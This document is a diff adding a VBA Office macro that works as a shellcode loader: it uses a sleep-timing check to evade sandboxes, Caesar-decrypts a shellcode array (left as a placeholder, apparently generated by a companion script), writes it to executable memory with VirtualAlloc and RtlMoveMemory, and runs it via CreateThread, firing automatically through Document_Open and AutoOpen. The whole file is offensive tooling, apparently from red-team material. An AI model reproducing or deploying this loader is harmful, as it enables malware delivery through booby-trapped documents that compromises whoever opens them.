@@ -1,0 +1,49 @@
+Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
+Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
+Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
+
+Sub RunShellCode()
+    Dim buf As Variant
+    Dim addr As LongPtr
+    Dim counter As Long
+    Dim data As LongPtr
+
+    Dim res As Long
+    Dim t1 As Date
+    Dim t2 As Date
+    Dim time As Long
+
+    t1 = Now()
+    Sleep (2000)
+    t2 = Now()
+    time = DateDiff("s", t1, t2)
+
+    If time < 2 Then
+        Exit Sub
+    End If
+
+    ' REPLACE THIS PART WITH ENCRYPTED SHELLCODE (from shellcode_macro_enc.py)
+    buf = Array(...
+
+    ' Caesar decryption (replace "- 2" with the key used in shellcode_macro_enc.py)
+    For i = 0 To UBound(buf)
+        buf(i) = buf(i) - 2
+    Next i
+
+    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
+    For counter = LBound(buf) To UBound(buf)
+        data = buf(counter)
+        res = RtlMoveMemory(addr + counter, data, 1)
+    Next counter
+    
+    res = CreateThread(0, 0, addr, 0, 0, 0)
+End Sub
+
+Sub Document_Open()
+    RunShellCode
+End Sub
+
+Sub AutoOpen()
+    RunShellCode
+End Sub
